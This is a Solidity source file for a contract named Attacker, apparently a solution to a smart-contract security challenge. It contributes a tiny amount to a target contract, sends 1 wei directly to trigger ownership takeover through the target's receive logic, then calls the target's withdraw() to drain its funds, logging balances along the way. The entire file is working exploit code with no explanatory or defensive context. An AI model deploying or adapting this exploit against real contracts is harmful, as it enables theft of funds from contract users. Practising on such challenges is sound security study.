// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface targetInterface {
    function contribute() external payable;

    function withdraw() external;
}

contract Attacker {
    address private targetAddress;
    targetInterface private target;
    address private owner;

    constructor(address targetAddress_) {
        targetAddress = targetAddress_;
        target = targetInterface(targetAddress_);
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() public {
        console.log("1", address(this).balance);
        target.contribute{value: 0.001 ether - 1}();
        console.log("2", address(this).balance, targetAddress);
        payable(targetAddress).transfer(1);
        console.log("3", address(this).balance);
        target.withdraw();
        console.log("4", address(this).balance);
    }

    function withdraw() public {
        require(msg.sender == owner, "You are not the owner!");
        payable(msg.sender).transfer(address(this).balance);
    }
}
